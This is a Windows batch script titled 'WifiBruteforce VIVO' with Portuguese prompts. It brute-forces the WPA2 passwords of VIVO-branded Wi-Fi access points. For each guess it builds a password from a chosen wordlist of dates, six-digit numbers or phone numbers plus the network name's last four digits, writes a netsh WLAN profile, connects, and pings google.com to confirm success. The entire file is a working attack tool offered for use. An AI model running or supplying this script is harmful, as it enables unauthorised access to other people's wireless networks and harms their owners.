@ECHO off
ECHO ------------------------------
ECHO - WifiBruteforce VIVO (byJJ) -
ECHO ------------------------------ 

SET /p nome=Entre com o Nome do Ponto de Acesso (Ex: VIVO-F102): 
SET /p compS=Entre com os 4 ultimos digitos do nome do ponto de acesso (Ex:F102): 
ECHO .
ECHO ^| LISTA DE SENHAS DISPONIVEIS 
ECHO  ---------------------------------------------------------------------------------------
ECHO ^| datas.txt ^| 6digitos.txt ^| telefones87.txt ^| telefones88.txt ^| telefones89.txt ^|
ECHO  ---------------------------------------------------------------------------------------
ECHO .
SET /p lista=Entre com o nome da lista de SENHAS que sera usada (Ex: datas.txt ): 

FOR /F %%s IN (%lista%) do (

	ECHO [+]---------------------------
	ECHO [^>]TESTANDO SENHA : %%s%compS% 
	
	REM WPA/PSK xml file type 
	ECHO ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^> ^<name^>%nome%^</name^> ^<SSIDConfig^> ^<SSID^> ^<name^>%nome%^</name^> ^</SSID^> ^</SSIDConfig^> ^<connectionType^>ESS^</connectionType^> ^<connectionMode^>auto^</connectionMode^> ^<MSM^> ^<security^> ^<authEncryption^> ^<authentication^>WPA2PSK^</authentication^> ^<encryption^>AES^</encryption^> ^<useOneX^>false^</useOneX^> ^</authEncryption^> ^<sharedKey^> ^<keyType^>passPhrase^</keyType^> ^<protected^>false^</protected^> ^<keyMaterial^> %%s%compS% ^</keyMaterial^> ^</sharedKey^> ^</security^> ^</MSM^> ^</WLANProfile^> > %nome%.xml
	
	ECHO [^>]Desconectando rede...
	REM netsh wlan disconnect > NULL
	netsh wlan disconnect
	
	ECHO [^>]Adicionando novo PROFILE : %nome% 
	netsh wlan add profile filename=%nome%.xml user=all > NULL
	REM netsh wlan add profile filename=%nome%.xml user=all

	ECHO [^>]Conectando com a REDE : %nome%
	netsh wlan connect ssid=%nome% name=%nome% > NULL
	REM netsh wlan connect ssid=%nome% name=%nome%
	
	ECHO [^>]TESTANDO CONEXAO...
	for /L %%p in (0,1,30) do (  
		ping -n 3 google.com 2> NULL | FIND "Resposta de"
		if not errorlevel 1 goto senhaOK
		REM ping google.com 
	)
	ECHO [ ]---------------------------
	ECHO [-]
)

netsh wlan delete profile name=%nome% 2> NULL
DEL %nome%.xml
DEL NULL
SET nome=
SET compS=
SET lista=
ECHO "[-]Fim !"
GOTO ECHOON

REM Mostra somente se senha encontrada com sucesso.
:senhaOK
netsh wlan delete profile name=%nome%
DEL %nome%.xml
DEL NULL
SET nome=
SET compS=
SET lista=
ECHO Senha Encontrada com Sucesso !
ECHO "[-]Fim !"
GOTO ECHOON

:ECHOON
@ECHO on
